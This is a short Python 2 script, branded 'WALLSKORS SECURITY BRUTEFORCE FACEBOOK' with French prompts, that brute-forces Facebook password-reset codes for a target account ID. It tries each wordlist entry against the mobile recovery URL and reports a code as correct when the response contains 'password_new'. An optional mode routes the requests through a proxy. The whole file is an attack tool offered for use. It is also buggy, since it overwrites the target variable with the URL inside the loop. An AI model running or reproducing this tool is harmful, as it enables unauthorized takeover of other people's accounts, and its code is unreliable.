#Recode gapapa
# -*-coding:utf-8 -*

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

import urllib2 ,sys ,re
import os
import ssl
import time

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux,windows][os.name == 'nt'])

cls()

os.system(['','color D'][os.name == 'nt'])

print F+'''
WALLSKORS SECURITY
BRUTEFORCE FACEBOOK
 '''
if len(sys.argv) != 3:
    print G+"\n\n[#] Ecriture: python2 fb.py [ID_Cible] [pas.txt] "
    sys.exit()

target = sys.argv[1]
wordlist = sys.argv[2]


while True:
    print """
    ============ Mode ==============
    1- (1) Inserer le code et changer le mot de passe
    2- (2) Inserer le code aja.
    
    """

    choice=raw_input("Mode choisi: ")

    if choice=="1":
        try:
            word = open(wordlist, 'r').readlines()
            print G+"[+] Son code a ete sauvegarde \!/\n[+] E+Codes:",len(word)
        except("IOError"):
            print "[-] Mauvais format!"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
    
            except IOError:
                print F+" Aucune connexion "
    
            search = re.search('password_new', get)
            if search:
                print "[+] Mot de passe : "+w+" correct !"
            else:
                print O+"[+] Mot de passe : "+w+" incorrect. "
    else:

        print """
        Inserer un mot de passe necessite un proxy!
        Entrez votre proxy

        Utilisation : [ip:port]

        """
        ip_proxy=raw_input("Entree Proxy  : ")
        print "[##] Proxy installe : "+ip_proxy
        proxy = urllib2.ProxyHandler({'http': ip_proxy})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        
        #ip = urllib2.urlopen('http://checkip.dyndns.org').read()
        #theIP = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", ip)
        #print theIP
        #datum = response.read()
        #response.close()
        #print datum
        try:
            word = open(wordlist, 'r').readlines()
            print F+"[+] Le code de reinitialisation a ete enregistre \!/\n[+] Code:",len(word)
        except("IOError"):
            print "[-] Mauvaise saisie!!"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()

            except IOError:
                print " Aucune connexion "
        
            search = re.search('password_new', get)
            if search:
                print "[+] Mot de passe: "+w+" correct !"
            else:
                print "[+] Mot de passe: "+w+" incorrect."
